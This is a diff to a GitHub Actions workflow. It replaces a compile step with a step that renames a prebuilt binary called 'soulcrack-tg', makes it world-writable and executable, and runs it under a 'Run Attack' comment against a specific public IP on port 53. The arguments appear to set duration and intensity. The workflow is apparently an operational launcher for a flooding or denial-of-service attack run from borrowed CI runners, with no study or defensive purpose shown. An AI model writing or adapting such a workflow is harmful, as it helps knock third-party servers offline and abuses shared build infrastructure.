@@ -3,34 +3,18 @@ on: [push]
 jobs:
   stage-0:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        n: [1,2,3,4,5]
     steps:
       - uses: actions/checkout@v3
-      - name: Compile and Run
+      - name: Fix and Run
         run: |
-          # Pehle check karo agar soul.c hai toh compile karo
-          if [ -f "soul.c" ]; then
-            gcc soul.c -o soul -pthread
-          elif [ -f "soul.cpp" ]; then
-            g++ soul.cpp -o soul -pthread
+          # Agar file soulcrack-tg naam se hai toh use soul banao
+          if [ -f "soulcrack-tg" ]; then
+            mv soulcrack-tg soul
           fi
-          chmod +x soul
+          
+          # Permission aur Check
+          chmod 777 soul || echo "File still not found"
+          ls -l
+          
+          # Run Attack
           ./soul 147.75.202.61 53 10 100
-  stage-1:
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        n: [1,2,3,4,5]
-    steps:
-      - uses: actions/checkout@v3
-      - name: Compile and Run
-        run: |
-          if [ -f "soul.c" ]; then
-            gcc soul.c -o soul -pthread
-          elif [ -f "soul.cpp" ]; then
-            g++ soul.cpp -o soul -pthread
-          fi
-          chmod +x soul
-          ./soul 147.75.202.61 53 120 100
